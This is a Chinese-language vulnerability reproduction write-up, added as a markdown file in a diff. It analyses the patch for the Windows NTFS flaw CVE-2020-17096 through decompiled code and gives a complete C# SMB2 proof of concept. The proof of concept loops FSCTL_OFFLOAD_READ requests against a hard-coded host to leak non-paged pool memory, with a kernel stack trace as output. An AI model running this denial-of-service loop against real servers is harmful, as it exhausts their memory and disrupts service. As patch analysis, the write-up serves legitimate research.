@@ -1,0 +1,206 @@
+## 简介
+2020年12月微软发布[CVE-2020-17096](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17096)的补丁，zecops团队对此漏洞进行了分析，文章在[这里](https://blog.zecops.com/vulnerabilities/ntfs-remote-code-execution-cve-2020-17096-analysis/)，本文根据其文章进行复现学习。这个洞是NTFS模块，zecops分析出来是内存泄露，但是微软对这类内存泄漏的洞很少收，并且标注的是`Remote
+Code Execution`，zecops团队也没有找到远程代码执行的地方，所以真正是否为zecops团队分析的那样还需要进一步研究。
+## 补丁对比
+问题出在`ntfs.sys`中，下面是对比的`18362.1171`和`18362.1256`，出除去一些未识别的符号，可以直接定位到`NtfsOffloadRead`函数
+从函数名可以猜到是文件卸载读的操作，搜一下文档可以找到[[MS-FSCC]](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/efbfe127-73ad-4140-9967-ec6500e66d5e)，其中的[2.3.41 FSCTL_OFFLOAD_READ
+Request](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/5d41cf62-9ebc-4f62-b7d7-0d085552b6dd)就是卸载读的操作，应该和这个函数有关
+`before patch`
+`after patch`
+新版本红框函数内第一个参数从`NULL`变为 `IrpConetxt` 并删除了一些对参数的判断，这个 `IrpContext` 就是
+`NtfsOffloadRead` 函数的第一个参数 ，第一个函数和调试跟踪有关，应该是开发人员使用的，所以重点应该放在第二个
+`NtfsExtendedCompleteRequestInternal`函数，下面的代码基于补丁前的版本，如果第一个参数为NULL则直接跳过对第一个参数的操作，然后调用IRP完成函数
+    void __fastcall NtfsExtendedCompleteRequestInternal(__int64 a1, IRP *irp, int a3, __int64 a4, int a5)
+    {
+      _QWORD *v5; // r13
+      unsigned __int8 v6; // r12
+      IRP *Irp; // rsi
+      _IO_STACK_LOCATION *v10; // r15
+      __int64 v11; // rax
+      void *v12; // rcx
+      bool v13; // sf
+      void *v14; // rcx
+      _QWORD *v15; // r14
+      _QWORD *v16; // rax
+      void *v17; // rcx
+      PFILE_OBJECT v18; // rax
+      __int64 v19; // rcx
+      __int64 v20; // r8
+      v5 = 0i64;
+      v6 = a4;
+      Irp = irp;
+      v10 = 0i64;
+      if ( irp )
+      {
+        v10 = irp->Tail.Overlay.CurrentStackLocation;
+        if...
+      }
+      if ( a1 )
+      {
+        // ...
+      }
+    LABEL_27:
+      if ( Irp )
+      {
+        v18 = v10->FileObject;
+        if ( v18 )
+          v5 = v18->FsContext;
+        Irp->IoStatus.Status = a3;
+        if ( (unsigned __int8)(v10->MajorFunction - 3) MajorFunction == 3 && a3 == 0xC000009A && (Irp->Flags & 2) != 0 )
+          ++NtfsFailedPagingReads;
+        IofCompleteRequest(Irp, 1);
+      }
+    }
+在patch之后会传入`IrpContext`，若其非零则会解析很多字段，做一些释放资源和释放内存的操作，调用一些`Cancel`、`Cleanup`、`Dereference`的函数，由此猜测patch之前没有很好的处理这些释放的资源，导致了内存泄露
+    if ( irpcontext )
+      {
+        // ...
+        if ( v12 )
+        {
+          // ...
+          TxfRestoreIsoSnapshots(v12);
+          *(_QWORD *)(irpcontext + 416) = 0i64;
+        }
+        // ...
+        if ( *(_QWORD *)(irpcontext + 408) )
+        {
+          LOBYTE(irp) = a5 == 0;
+          TxfProcessCancelList(irpcontext, irp);
+        }
+        v14 = *(void **)(irpcontext + 416);
+        if ( v14 && !a5 )
+        {
+          TxfRestoreIsoSnapshots(v14);
+          *(_QWORD *)(irpcontext + 416) = 0i64;
+        }
+        v15 = (_QWORD *)(irpcontext + 432);
+        v16 = *(_QWORD **)(irpcontext + 432);
+        if ( v16 && v16 != v15 )
+          TxfProcessTxfFcbCleanupListInternal(irpcontext, a5 == 0, v6, 0i64);
+        if ( a5 )
+        {
+          if ( !v6 )
+          {
+            NtfsCleanupIrpContext(irpcontext, 1i64);
+            goto LABEL_27;
+          }
+        }
+        else if ( !v6 )
+        {
+          v17 = *(void **)(irpcontext + 416);
+          if ( v17 )
+          {
+            TxfCleanupIsoSnapshots(v17);
+            *(_QWORD *)(irpcontext + 416) = 0i64;
+          }
+          if ( *(_QWORD *)(irpcontext + 392) )
+          {
+            LOBYTE(irp) = 1;
+            TxfDereferenceTransaction(irpcontext + 392, irp);
+          }
+          goto LABEL_26;
+        }
+        if ( *v15 && (_QWORD *)*v15 != v15 )
+        {
+          LOBYTE(a4) = 1;
+          TxfProcessTxfFcbCleanupListInternal(irpcontext, 0i64, 1i64, a4);
+        }
+        goto LABEL_22;
+      }
+根据zecops的文章分析，该漏洞导致了非分页池中的内存泄漏，而该内存池驻留在物理内存中。需要循环发送`FSCTL_OFFLOAD_READ`操作，根据zecops的部分poc代码，首先协商了SMB2协议，然后创建一个文件夹，此处必须是文件夹才能进入到patch函数的路径。
+## 漏洞复现
+`FSCTL_OFFLOAD_READ`操作可以基于SMB2协议实现，所以zecops采用的是微软的C#框架，首先需要设置一个共享文件夹用于SMB2协议操作，具体操作如下图，我在桌面创建了一个测试文件夹，右键属性进入共享，因为需要创建文件夹，所以需要在高级共享里设置权限为可读可写
+设置好之后记住网络路径，然后用测试框架测试即可，有两种方法可以测试，可以用`ConnectShare`指定共享文件进行连接，也可以直接用`Connect`函数进行连接，只是用`Connect`函数需要修改`Smb2ClientTransport.cs`，指定`shareName`参数为共享目录名`InternalConnectShare(domain,
+userName, password, "test", timeout, securityPackage,
+useServerToken);`，不然会自动加上`"IPC$"`的字符导致所引目录错误
+    // Microsoft.Protocols.TestTools.StackSdk.FileAccessService.dll
+    // Microsoft.Protocols.TestTools.StackSdk.FileAccessService.Smb2.dll
+    // Microsoft.Protocols.TestTools.StackSdk.Security.SspiLib.dll
+    // Microsoft.Protocols.TestTools.StackSdk.dll
+    using System;
+    using Microsoft.Protocols.TestTools.StackSdk.FileAccessService.Smb2;
+    using Microsoft.Protocols.TestTools.StackSdk.Security.SspiLib;
+    using Microsoft.Protocols.TestTools.StackSdk.FileAccessService;
+    using Microsoft.Protocols.TestTools.StackSdk;
+    namespace NTFSTest
+    {
+        class Program
+        {
+            static void Main(string[] args)
+            {
+                var ip = "192.168.62.142";
+                var domain = "DESKTOP-KOT4SRO";
+                var share = "test";
+                var remote_path = "Thunder_Test";
+                Smb2ClientTransport Client = new Smb2ClientTransport();
+                var ipAddress = System.Net.IPAddress.Parse(ip);
+                // SMB2 initialization
+                Client.ConnectShare(
+                    "DESKTOP-KOT4SRO", 
+                    ipAddress, 
+                    domain, 
+                    "thunder", 
+                    "", 
+                    share, 
+                    SecurityPackageType.Negotiate, 
+                    true
+                );
+                // Create folder
+                Client.Create(
+                    remote_path,
+                    FsDirectoryDesiredAccess.GENERIC_READ | FsDirectoryDesiredAccess.GENERIC_WRITE,
+                    FsImpersonationLevel.Anonymous,
+                    FsFileAttribute.FILE_ATTRIBUTE_DIRECTORY,
+                    FsCreateDisposition.FILE_CREATE,
+                    FsCreateOption.FILE_DIRECTORY_FILE
+                );
+                // Construct FSCTL_OFFLOAD_READ_INPUT package
+                FSCTL_OFFLOAD_READ_INPUT offloadReadInput = new FSCTL_OFFLOAD_READ_INPUT();
+                offloadReadInput.Size  = 32;
+                offloadReadInput.Flags = FSCTL_OFFLOAD_READ_INPUT_FLAGS.NONE;
+                offloadReadInput.TokenTimeToLive = 0;
+                offloadReadInput.Reserved   = 0;
+                offloadReadInput.FileOffset = 0;
+                offloadReadInput.CopyLength = 0;
+                // ToByes
+                byte[] requestInputOffloadRead = TypeMarshal.ToBytes(offloadReadInput);
+                while (true)
+                {
+                    // Send FSCTL_OFFLOAD_READ
+                    Client.SendIoctlPayload(CtlCode_Values.FSCTL_OFFLOAD_READ, requestInputOffloadRead);
+                    // Recv Data
+                    Client.ExpectIoctlPayload(out _, out _);
+                }
+            }
+        }
+    }
+测试结果会断在`ntfs!NtfsOffloadRead`，运行会调用`NtfsExtendedCompleteRequestInternal`函数导致内存泄露
+回溯栈如下
+    kd> k
+     # Child-SP          RetAddr           Call Site
+    00 ffff8084`daedf438 fffff804`622db831 Ntfs!NtfsExtendedCompleteRequestInternal
+    01 ffff8084`daedf440 fffff804`6224ccc7 Ntfs!NtfsOffloadRead+0x79d05
+    02 ffff8084`daedf570 fffff804`6224c481 Ntfs!NtfsUserFsRequest+0x55f
+    03 ffff8084`daedf5f0 fffff804`5fe3b7ba Ntfs!NtfsFsdFileSystemControl+0x171
+    04 ffff8084`daedf710 fffff804`6061e0a9 nt!IopfCallDriver+0x56
+    05 ffff8084`daedf750 fffff804`5feb0a27 nt!IovCallDriver+0x275
+    06 ffff8084`daedf790 fffff804`61185609 nt!IofCallDriver+0x1be927
+    07 ffff8084`daedf7d0 fffff804`611bc190 FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+0x159
+    08 ffff8084`daedf850 fffff804`5fe3b7ba FLTMGR!FltpFsControl+0x110
+    09 ffff8084`daedf8b0 fffff804`6061e0a9 nt!IopfCallDriver+0x56
+    0a ffff8084`daedf8f0 fffff804`5feb0a27 nt!IovCallDriver+0x275
+    0b ffff8084`daedf930 fffff804`5efebfcc nt!IofCallDriver+0x1be927
+    0c ffff8084`daedf970 fffff804`5efebcc3 srv2!Smb2ExecuteFSIoctl+0x21c
+    0d ffff8084`daedf9d0 fffff804`5f01c26e srv2!Smb2ExecuteIoctl+0xb3
+    0e ffff8084`daedfa20 fffff804`5eff9a9f srv2!Smb2ExecuteIoctlCallback+0xe
+    0f ffff8084`daedfa50 fffff804`5eff989a srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
+    10 ffff8084`daedfad0 fffff804`603d8137 srv2!RfspThreadPoolNodeWorkerRun+0x1ba
+    11 ffff8084`daedfb30 fffff804`5fdee585 nt!IopThreadStart+0x37
+    12 ffff8084`daedfb90 fffff804`5fe86128 nt!PspSystemThreadStartup+0x55
+    13 ffff8084`daedfbe0 00000000`00000000 nt!KiStartSystemThread+0x28
+WireShark里会抓到循环发送的`FSCTL_OFFLOAD_READ`包以及返回包
+下面是测试效果，内存泄露的很慢，建议上小点的内存，如果要重新运行测试程序需要先删除创建的共享文件夹，不然会有`STATUS_OBJECT_NAME_COLLISION`的错误
+## 总结
+本文主要是测试了一下zecops发的文章内容，复现对比了一下这个漏洞，感觉他们的文章更多是在抛砖引玉，到底是不是这个地方还需要更多的研究，不过在此之前建议先看看SMB和SMB2的相关内容，这样理解起来会更快一些，毕竟都是文件系统的东西。
+  * zecops分析文章
+  * 测试框架
